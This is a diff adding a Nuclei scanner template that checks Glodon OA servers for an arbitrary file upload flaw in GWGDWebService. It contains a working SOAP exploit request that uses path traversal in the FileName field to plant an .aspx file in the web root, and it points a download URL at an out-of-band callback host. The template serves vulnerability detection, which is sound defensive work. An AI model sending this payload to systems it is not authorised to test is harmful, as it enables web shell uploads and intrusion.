@@ -1,0 +1,47 @@
+id: glodon-gwgdwebservice-anyfile-upload
+info:
+  name: Glodon OA GWGDWebService Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog,file-upload
+http:
+  - raw:
+      - |
+        POST /GB/LK/ArchiveManagement/Js/GWGDWebService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <tem:GetGWGDData>
+                <tem:data>
+                    <root>
+                      <GWINFO>
+                          <公文标题>1</公文标题>
+                          <拟稿人>拟稿人</拟稿人>
+                          <主送单位>主送单位</主送单位>
+                          <主题词>主题词</主题词>
+                          <印发份数>1</印发份数>
+                          <签发日期>2022-12-07</签发日期>
+                      </GWINFO>
+                      <aa>
+                          <FileName>./../../../../../../../applications/gtp-default/Web/Common/768a9b.aspx</FileName>
+                          <DownLoadURL>http://{{interactsh-url}}</DownLoadURL>
+                      </aa>
+                    </root>
+                </tem:data>
+              </tem:GetGWGDData>
+          </soapenv:Body>
+        </soapenv:Envelope>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "服务器无法处理请求"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
